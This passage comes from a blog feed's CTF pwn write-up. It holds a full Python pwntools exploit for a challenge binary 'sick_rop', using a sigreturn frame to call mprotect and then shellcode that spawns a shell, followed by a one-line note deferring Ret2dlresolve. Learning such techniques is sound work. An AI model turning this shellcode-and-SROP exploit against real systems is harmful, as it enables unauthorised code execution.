class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :p.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./sick_rop&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;157.245.40.78&#x27;,32071)</span><br>vul = <span class="hljs-number">0x40102E</span><br>syscall_ret = <span class="hljs-number">0x40102B</span> <br><br>fuck = SigreturnFrame()<br>fuck.rax = <span class="hljs-number">10</span><br>fuck.rdi = <span class="hljs-number">0x401000</span><br>fuck.rsi = <span class="hljs-number">0x2000</span><br>fuck.rdx = <span class="hljs-number">7</span><br>fuck.rsp = <span class="hljs-number">0x4010d8</span><br>fuck.rip = syscall_ret<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>,<span class="hljs-number">0xdeadbeef</span>,vul,syscall_ret,fuck]<br>)<br>sl(payload)<br>pause()<br>se(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">15</span>)<br><br>payload=flat(<br>    [<span class="hljs-string">&#x27;wsnd\0&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;\0&#x27;</span>),vul,<span class="hljs-number">0x4010f0</span>,asm(shellcraft.sh())] <br>)<br>pause()<br>se(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><hr><h1>Ret2dlresolve</h1><p>学不会，成消愁了，以后补上吧（但愿）。run 了 run 了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
